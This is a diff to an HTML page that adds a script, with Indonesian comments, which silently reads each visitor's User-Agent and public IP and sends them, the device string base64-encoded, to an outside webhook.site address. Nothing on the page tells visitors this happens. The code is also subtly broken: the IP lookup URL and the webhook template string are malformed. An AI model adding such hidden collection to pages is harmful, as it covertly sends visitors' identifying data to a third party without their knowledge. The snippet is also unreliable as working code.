@@ -222,5 +222,20 @@
     }
   }, 1000);
 </script>
+  <script>
+  // Mengambil User-Agent untuk tahu Merek/Model HP
+  var device = navigator.userAgent;
+
+  // Mengambil IP (menggunakan bantuan API luar karena JS murni tidak bisa baca IP publik langsung)
+  fetch('https://ipify.org')
+    .then(response => response.json())
+    .then(data => {
+        var ip = data.ip;
+        
+        // Kirim semua data ke Webhook Anda
+        fetch(`https://webhook.site{ip}&device=${btoa(device)}`);
+    });
+</script>
+
 </body>
 </html>
